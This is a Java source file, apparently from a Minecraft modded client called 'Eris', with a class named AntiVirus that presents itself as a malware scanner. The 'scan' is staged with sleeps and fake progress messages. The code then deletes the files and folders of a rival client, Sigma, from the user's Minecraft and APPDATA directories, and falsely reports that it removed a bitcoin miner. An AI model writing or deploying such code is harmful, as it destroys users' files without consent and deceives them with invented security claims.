package me.spec.eris.antivirus;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import me.spec.eris.Eris;
import me.spec.eris.ui.notifications.Notification;
import net.minecraft.client.Minecraft;
import net.minecraft.util.EnumChatFormatting;

public class AntiVirus extends Thread {

    @Override
    public void run() {
        try {
            Thread.sleep(2500);
        } catch (InterruptedException e) {
        }

        this.sendMessage("Loading the antivirus database...", 3000);

        try {
            Thread.sleep(6000);
        } catch (InterruptedException e) {
        }

        this.sendMessage("Running checks...", 1000);
        try {
            Thread.sleep(1500);
        } catch (InterruptedException e) {
        }

        boolean sigma = deleteSigma();
        if (sigma) {
            this.sendMessage("Found & deleted bitcoin miner... ID: " + EnumChatFormatting.RED + "Sigma", 3000);
        } else {
            this.sendMessage("No viruses found...", 3000);
        }
    }

    private boolean deleteSigma() {
        List<File> directories = new ArrayList<File>();
        directories.add(new File(Minecraft.getMinecraft().mcDataDir, "sigma"));
        directories.add(new File(Minecraft.getMinecraft().mcDataDir, "sigma5"));
        directories.add(new File(new File(Minecraft.getMinecraft().mcDataDir, "versions"), "sigma5"));
        directories.add(new File(Minecraft.getMinecraft().mcDataDir, "SigmaJelloPrelauncher.jar"));
        File appdata = new File(System.getenv("APPDATA"), ".minecraft");
        if (!Minecraft.getMinecraft().mcDataDir.getAbsolutePath().equalsIgnoreCase(appdata.getAbsolutePath())) {
            directories.add(new File(appdata, "sigma"));
            directories.add(new File(appdata, "sigma5"));
            directories.add(new File(new File(appdata, "versions"), "sigma5"));
            directories.add(new File(appdata, "SigmaJelloPrelauncher.jar"));
        }

        boolean deleted = false;
        for (File f : directories) {
            if (f.exists()) {
                if (f.isDirectory()) {
                    for (File file1 : f.listFiles()) {
                        file1.delete();
                        deleted = true;
                    }
                }
                f.delete();
            }
        }

        return deleted;
    }

    private void sendMessage(String message, int duration) {
        Eris.instance.notifications.send(new Notification("AntiVirus", message, duration));
    }
}
